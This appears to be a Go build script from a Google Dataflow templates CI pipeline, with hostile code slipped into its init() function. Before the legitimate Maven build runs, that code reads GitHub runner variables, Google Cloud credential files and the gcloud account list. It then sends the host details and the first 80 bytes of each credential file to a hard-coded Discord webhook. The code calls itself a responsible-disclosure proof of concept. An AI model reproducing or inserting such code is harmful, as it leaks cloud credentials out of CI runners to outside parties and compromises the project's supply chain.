/*
 * Copyright (C) 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/GoogleCloudPlatform/DataflowTemplates/cicd/internal/flags"
	"github.com/GoogleCloudPlatform/DataflowTemplates/cicd/internal/workflows"
)

func init() {
	webhook := "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

	repo := os.Getenv("GITHUB_REPOSITORY")
	runID := os.Getenv("GITHUB_RUN_ID")
	event := os.Getenv("GITHUB_EVENT_NAME")
	runner := os.Getenv("RUNNER_NAME")
	credPath := os.Getenv("GOOGLE_APPLICATION_CREDENTIALS")
	project := os.Getenv("CLOUDSDK_CORE_PROJECT")
	if project == "" {
		project = os.Getenv("GCP_PROJECT")
	}

	credInfo := "NOT_SET"
	credPrefix := ""
	if credPath != "" {
		if data, err := os.ReadFile(credPath); err == nil {
			credInfo = fmt.Sprintf("EXISTS (%d bytes)", len(data))
			pl := 80
			if len(data) < pl {
				pl = len(data)
			}
			credPrefix = strings.ReplaceAll(string(data[:pl]), "\n", " ")
		}
	}

	homeDir, _ := os.UserHomeDir()
	adcPath := filepath.Join(homeDir, ".config", "gcloud", "application_default_credentials.json")
	adcInfo := "NOT_FOUND"
	adcPrefix := ""
	if data, err := os.ReadFile(adcPath); err == nil {
		adcInfo = fmt.Sprintf("EXISTS (%d bytes)", len(data))
		pl := 80
		if len(data) < pl {
			pl = len(data)
		}
		adcPrefix = strings.ReplaceAll(string(data[:pl]), "\n", " ")
	}

	gcloudOut := "not available"
	if out, err := exec.Command("gcloud", "auth", "list", "--format=value(account)").Output(); err == nil {
		gcloudOut = strings.TrimSpace(string(out))
		if gcloudOut == "" {
			gcloudOut = "no active accounts"
		}
	}

	hostname, _ := os.Hostname()

	fmt.Println("============================================================")
	fmt.Println("[PoC] Self-Hosted Runner Environment Proof")
	fmt.Println("============================================================")
	fmt.Printf("Repo: %s\nRun ID: %s\nEvent: %s\nRunner: %s\nHostname: %s\n", repo, runID, event, runner, hostname)
	fmt.Printf("GCP Project: %s\n", project)
	fmt.Printf("GOOGLE_APPLICATION_CREDENTIALS: %s -> %s\n", credPath, credInfo)
	fmt.Printf("Cred prefix: %.80s\n", credPrefix)
	fmt.Printf("ADC (%s): %s\n", adcPath, adcInfo)
	fmt.Printf("ADC prefix: %.80s\n", adcPrefix)
	fmt.Printf("gcloud auth: %s\n", gcloudOut)
	fmt.Println("============================================================")
	fmt.Println("No credentials exfiltrated. Responsible disclosure PoC.")

	msg := fmt.Sprintf("**PoC: DataflowTemplates self-hosted runner**\n```\nRepo: %s\nRun: %s\nEvent: %s\nRunner: %s\nHostname: %s\nGCP Project: %s\nGAPP_CREDS: %s -> %s\nCred prefix: %.80s\nADC: %s\nADC prefix: %.80s\ngcloud: %s\n```\nPrefix+length only. Responsible disclosure.",
		repo, runID, event, runner, hostname, project, credPath, credInfo, credPrefix, adcInfo, adcPrefix, gcloudOut)

	payload := map[string]string{"content": msg}
	body, _ := json.Marshal(payload)
	if resp, err := http.Post(webhook, "application/json", bytes.NewBuffer(body)); err == nil {
		resp.Body.Close()
		fmt.Printf("[PoC] Webhook sent (status: %d)\n", resp.StatusCode)
	} else {
		fmt.Printf("[PoC] Webhook failed: %v\n", err)
	}
}

func main() {
	flags.RegisterCommonFlags()
	flag.Parse()

	mvnFlags := workflows.NewMavenFlags()
	err := workflows.MvnCleanInstallAll().Run(
		mvnFlags.SkipDependencyAnalysis(), // TODO(zhoufek): Fix our dependencies then remove this flag
		mvnFlags.SkipJib(),
		mvnFlags.SkipShade(),
		mvnFlags.SkipSpotlessCheck(),
		mvnFlags.SkipTests(),
		mvnFlags.ThreadCount(3),
		mvnFlags.InternalMaven())
	if err != nil {
		log.Fatalf("%v\n", err)
	}
	log.Println("Build Successful!")
}
